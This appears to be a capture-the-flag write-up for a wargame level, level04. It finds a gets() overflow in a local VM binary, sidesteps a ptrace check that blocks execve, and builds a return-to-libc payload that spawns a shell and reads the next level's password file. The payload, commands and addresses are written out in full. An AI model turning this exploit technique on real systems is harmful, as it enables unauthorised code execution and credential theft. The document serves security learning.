# level04

For now, we only retrieve the `level04` binary from the VM and save the GDB disassembly of `main`.

## Connect to level04

Read the password obtained from level03:

```sh
cat level03/flag
```

Connect to the VM:

```sh
ssh level04@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level03/flag`.

## Get the binary

From the repository root on the host, copy the ELF binary:

```sh
scp -P 2222 level04@127.0.0.1:/home/users/level04/level04 ./level04/src/level04
```

Use the content of `level03/flag` as the password.

The local binary should now be:

```text
level04/src/level04
```

## Save `main_dump_gdb`

On the VM, start GDB with the binary loaded:

```sh
gdb ./level04
```

The VM uses GDB 7.4, so use the old logging syntax:

```gdb
set disassembly-flavor intel
set logging file /tmp/level04_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Verify that the dump exists on the VM:

```sh
ls -l /tmp/level04_main_dump_gdb
```

From the repository root on the host, copy it into `level04/src`:

```sh
scp -P 2222 level04@127.0.0.1:/tmp/level04_main_dump_gdb ./level04/src/main_dump_gdb
```

Use the content of `level03/flag` as the password.

The local files for the next analysis step are:

```text
level04/src/level04
level04/src/main_dump_gdb
```

## Verify the dump

The correct level04 dump starts with:

```asm
0x080486c8 <+0>: push ebp
```

It must contain calls to `fork`, `ptrace`, `wait`, `gets`, and `kill`. If it starts at `0x0804885a` and calls `time`, `srand`, and `test`, the file is still the level03 dump and must be replaced before continuing.

The important child-process sequence in the dump is:

```asm
lea    eax,[esp+0x20]
mov    DWORD PTR [esp],eax
call   0x80484b0 <gets@plt>
```

`gets` does not enforce a maximum input length. It writes into a local buffer beginning at `[esp+0x20]`, so this is the buffer-overflow candidate for the next analysis step.

## Decode addresses from `main_dump_gdb`

The correct dump contains three message addresses:

```sh
./decode_address level04/src/level04 0x8048903
./decode_address level04/src/level04 0x804891d
./decode_address level04/src/level04 0x8048931
```

They decode to:

```text
0x08048903 -> "Give me some shellcode, k"
0x0804891d -> "child is exiting..."
0x08048931 -> "no exec() for you"
```

## Confirm the buffer overflow

The child process passes the address of its local buffer directly to `gets`:

```asm
lea    eax,[esp+0x20]
mov    DWORD PTR [esp],eax
call   0x80484b0 <gets@plt>
```

The buffer is initialized as 128 bytes earlier in `main`, but `gets` accepts input of any length. Data written after the buffer can therefore reach the saved return address.

Create a test payload on the level04 VM. The candidate offset to the return address is 156 bytes, followed by `BBBB` as a recognizable marker:

```sh
python -c 'print("A" * 156 + "BBBB")' > /tmp/level04_crash
```

Start GDB with the level04 binary:

```sh
gdb ./level04
```

The vulnerable `gets` runs in the child created by `fork`, so tell GDB to follow that child:

```gdb
set follow-fork-mode child
set pagination off
run < /tmp/level04_crash
```

After the segmentation fault, inspect the instruction pointer:

```gdb
info registers eip
```

If the offset is correct, the result is:

```text
eip  0x42424242
```

`0x42` is the ASCII value of `B`. Seeing `0x42424242` confirms that 156 bytes reach the saved return address and that the following four bytes control `eip`.

## Understand the `ptrace` protection

The parent process reads a register from the child with `ptrace` and compares the result with `0xb`:

```asm
mov    DWORD PTR [esp+0x8],0x2c
mov    DWORD PTR [esp],0x3
call   0x8048570 <ptrace@plt>
cmp    DWORD PTR [esp+0xa8],0xb
```

On 32-bit Linux, syscall number `0xb` is `execve`. A normal shellcode that directly executes `execve("/bin/sh", ...)` is therefore detected, after which the parent kills the child.

Instead, use return-to-libc: overwrite the return address with the address of `system` and pass the existing libc string `"/bin/sh"` as its argument.

## Find the libc addresses

Start GDB on the level04 VM and stop after the process has started so that libc is loaded:

```sh
gdb ./level04
```

```gdb
set pagination off
break main
run
p/x (void *)system
p/x (void *)exit
info proc mappings
```

In the mapping output, find the start and end addresses of `libc`. Search that range for the existing string:

```gdb
find LIBC_START, LIBC_END, "/bin/sh"
```

Replace `LIBC_START` and `LIBC_END` with the hexadecimal bounds displayed by `info proc mappings`. Record these three addresses:

```text
system address
exit address
"/bin/sh" address
```

Run GDB again and verify that the addresses remain stable before building the final payload. If they change, ASLR must be accounted for rather than hardcoding one run's addresses.

For this VM run, GDB reported:

```text
system = 0xf7e6aed0
exit   = 0xf7e5eb70
```

The libc mappings begin at `0xf7e2c000` and end at `0xf7fd0000`. Search that complete range:

```gdb
find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
```

The address returned by this command is the third value needed for the return-to-libc payload.

The search returned:

```text
"/bin/sh" = 0xf7f897ec
```

The three required addresses are therefore:

```text
system     = 0xf7e6aed0
exit       = 0xf7e5eb70
"/bin/sh" = 0xf7f897ec
```

## Build the return-to-libc payload

After the 156-byte padding, the overwritten stack must have this layout:

```text
system address       -> new return address
exit address         -> return address used when system finishes
"/bin/sh" address    -> first argument passed to system
```

This is equivalent to calling:

```c
system("/bin/sh");
exit(...);
```

Create the payload on the level04 VM. `struct.pack("<I", value)` writes each 32-bit address in little-endian byte order:

```sh
python -c 'import struct; print("A" * 156 + struct.pack("<I", 0xf7e6aed0) + struct.pack("<I", 0xf7e5eb70) + struct.pack("<I", 0xf7f897ec))' > /tmp/level04_payload
```

Run the binary while keeping standard input open for the resulting shell:

```sh
(cat /tmp/level04_payload; cat) | /home/users/level04/level04
```

The shell reads from a pipe, not a terminal, so it may not display a prompt. Type the following commands even if no prompt is visible:

```sh
whoami
cat /home/users/level05/.pass
```

Alternatively, send the commands with the payload instead of using an interactive `cat`:

```sh
(cat /tmp/level04_payload; printf 'whoami\ncat /home/users/level05/.pass\n') | /home/users/level04/level04
```

## Save the flag

Back on the host, write the password displayed by `/home/users/level05/.pass` into:

```text
level04/flag
```

Verify the saved value:

```sh
cat level04/flag
```

## Connect to level05

Use the content of `level04/flag` as the SSH password:

```sh
ssh level05@127.0.0.1 -p 2222
```
